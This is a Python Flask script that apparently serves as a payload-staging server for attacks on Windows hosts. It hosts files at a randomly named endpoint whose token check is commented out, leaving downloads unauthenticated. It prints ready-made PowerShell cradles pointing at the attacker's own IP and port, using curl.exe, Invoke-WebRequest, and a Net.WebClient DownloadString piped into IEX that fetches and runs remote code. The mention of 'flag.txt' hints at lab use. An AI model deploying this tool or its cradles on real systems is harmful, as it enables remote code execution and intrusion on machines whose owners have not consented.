from flask import Flask, request, send_from_directory, abort
import os,string, secrets, argparse, socket, fcntl, struct

alphabet = string.ascii_letters + string.digits

app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

TOKEN = ''.join(secrets.choice(alphabet) for i in range(32))
download_endpoint = ''.join(secrets.choice(alphabet) for i in range(16))

@app.route(f'/{download_endpoint}/<filename>', methods=['GET'])
def download_file(filename):
    token = request.headers.get('Authorization')

    #if not token or token != TOKEN:
    #    abort(403, description="Forbidden: Invalid token")

    file_path = os.path.join(UPLOAD_FOLDER, filename)

    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

def get_interface_ip(interface_name):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packed_iface = struct.pack('256s', interface_name.encode('utf_8'))
    packed_addr = fcntl.ioctl(sock.fileno(), 0x8915, packed_iface)[20:24]
    return socket.inet_ntoa(packed_addr)

def invoke_obfuscation(ip,token,download_endpoint,port):
    payload1=f'$file="flag.txt";$url="http://{ip}:{port}/{download_endpoint}/";$outputPath = Join-Path -Path (Get-Location) -ChildPath $file;curl.exe "$url$file" -H "Authorization: {token}" -O $outputPath'
    payload2=f'$file="flag.txt";$url="http://{ip}:{port}/{download_endpoint}/";$webClient = New-Object Net.WebClient;$webClient.Headers.Add("Authorization", "{token}");$webClient.DownloadString("$url$file")|IEX'
    payload3 = f'$file="flag.txt";$url="http://{ip}:{port}/{download_endpoint}/";$outputPath = Join-Path -Path (Get-Location) -ChildPath $file;Invoke-WebRequest -Uri "$url$file" -Headers @{{"Authorization"="{token}"}} -OutFile $outputPath'
    print('[+] Payloads :')
    list_payload = [payload1,payload2,payload3]
    for payload in list_payload: print(payload)
    return print()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Run Web server on a specified network interface.')
    parser.add_argument('-I', '--interface', required=True, help='Network interface to run the server on')
    parser.add_argument('-P','--port', required=True, help='Port number for running the web server')
    args = parser.parse_args()

    ip_address = get_interface_ip(args.interface)
    if ip_address:
        print(f"[+] Token: {TOKEN}")
        print(f'[+] URL: http://{ip_address}:{args.port}/{download_endpoint}/<filename>\n')
        invoke_obfuscation(ip_address,TOKEN,download_endpoint,args.port)
        app.run(host=ip_address, port=args.port)
    else:
        print(f"No IP address found for interface {args.interface}")
    


